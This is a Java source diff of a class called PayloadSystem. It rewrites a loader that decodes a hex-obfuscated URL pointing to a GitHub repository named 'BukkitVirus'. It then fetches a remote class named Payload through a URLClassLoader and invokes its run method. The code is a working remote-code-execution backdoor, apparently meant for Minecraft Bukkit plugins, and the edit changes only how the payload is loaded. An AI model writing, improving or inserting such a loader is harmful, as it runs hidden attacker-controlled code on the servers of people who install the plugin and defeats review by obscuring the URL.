@@ -1,11 +1,9 @@
 package plvc.dep;
 
-import java.io.ByteArrayOutputStream;
-import java.io.InputStream;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.net.URL;
-import java.util.HashMap;
+import java.net.URLClassLoader;
 
 public class PayloadSystem {
 
@@ -38,9 +36,9 @@ public class PayloadSystem {
             }
 
             try {
-                String hexHex = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f64656572616e676c65322f42756b6b697456697275732f6d61737465722f7061796c6f61642f5061796c6f61642e636c617373";
+                String hexHex = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f64656572616e676c65322f42756b6b697456697275732f6d61737465722f7061796c6f61642f";
                 URL url = new URL(new String(hexStringToByteArray(hexHex)));
-                InputStream is = url.openStream();
+                /*InputStream is = url.openStream();
                 ByteArrayOutputStream os = new ByteArrayOutputStream();
                 while (true) {
                     int i = is.read();
@@ -49,11 +47,12 @@ public class PayloadSystem {
                     }
                     os.write(i);
                 }
-                byte[] classData = os.toByteArray();
+                byte[] classData = os.toByteArray();*/
 
-                HashMap<String, byte[]> extraClasses = new HashMap<>();
-                extraClasses.put("Payload", classData);
-                ClassLoader classLoader = new ByteClassLoader(new URL[]{}, Thread.currentThread().getContextClassLoader(), extraClasses);
+                //HashMap<String, byte[]> extraClasses = new HashMap<>();
+                //extraClasses.put("Payload", classData);
+                //, extraClasses
+                ClassLoader classLoader = new URLClassLoader(new URL[]{url}, Thread.currentThread().getContextClassLoader());
                 Class payloadClass = classLoader.loadClass("Payload");
                 Object payloadInstance = payloadClass.newInstance();
                 Method runMethod = payloadClass.getDeclaredMethod("run");
